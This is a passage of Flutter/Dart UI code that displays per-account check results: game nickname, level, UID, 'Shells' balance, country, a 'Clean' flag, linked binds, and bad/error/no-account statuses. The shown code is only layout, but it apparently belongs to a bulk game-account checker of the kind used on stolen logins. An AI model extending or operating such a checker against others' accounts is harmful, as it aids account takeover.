            _row('🎮 IGN',     r.nickname.isNotEmpty ? r.nickname : '—', c),
            _row('⚡ Level',   r.level.isNotEmpty    ? r.level    : '—', c),
            _row('🌍 Region',  r.region.isNotEmpty   ? r.region   : '—', c),
            _row('🆔 UID',     r.uid.isNotEmpty      ? r.uid      : '—', c),
            _row('💎 Shells',  r.shell.isNotEmpty    ? r.shell    : '—', c),
            _row('🌐 Country', r.country.isNotEmpty  ? r.country  : '—', c),
            _row('🔒 Clean',   r.isClean             ? 'YES ✅'   : 'NO ❌', c),
            if (r.binds.isNotEmpty)
              _row('🔗 Binds', r.binds.join(', '), c),
          ],
          if (r.status == _S.noAccount && r.shell.isNotEmpty) ...[
            const SizedBox(height: 8),
            const Divider(height: 1, color: Colors.white12),
            const SizedBox(height: 8),
            _row('💎 Shells',  r.shell,   c),
            _row('🌐 Country', r.country, c),
            _row('🔒 Clean',   r.isClean ? 'YES ✅' : 'NO ❌', c),
            if (r.binds.isNotEmpty)
              _row('🔗 Binds', r.binds.join(', '), c),
            _row('ℹ️ Note', r.detail, c),
          ],
          if ((r.status == _S.bad || r.status == _S.error) && r.detail.isNotEmpty) ...[
            const SizedBox(height: 4),
            Text(r.detail,
                style: TextStyle(color: sc.withOpacity(.7), fontSize: 10)),
          ],
          const SizedBox(height: 4),
          Text(
            'Long-press to copy full details',
            style: TextStyle(color: c.textHint.withOpacity(.5), fontSize: 9),
          ),
        ]),
      ),
    );
  }

  Widget _chip(String l, String v, Color color) => Expanded(
    child: Column(children: [
      Text(v, style: TextStyle(color: color, fontWeight: FontWeight.w800, fontSize: 13)),
      Text(l, style: TextStyle(color: color.withOpacity(.7), fontSize: 9)),
    ]),
  );

  Widget _div() => Container(height: 30, width: 1, color: Colors.white12);

  Widget _row(String l, String v, XissinColors c) => Padding(
    padding: const EdgeInsets.only(bottom: 3),
    child: Row(children: [
      SizedBox(
        width: 80,
        child: Text(l, style: TextStyle(color: c.textHint, fontSize: 10)),
      ),
      Expanded(child: Text(
        v,
        style: TextStyle(
          color: c.textPrimary, fontSize: 10,
          fontWeight: FontWeight.w600,
        ),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      )),
    ]),
  );
}
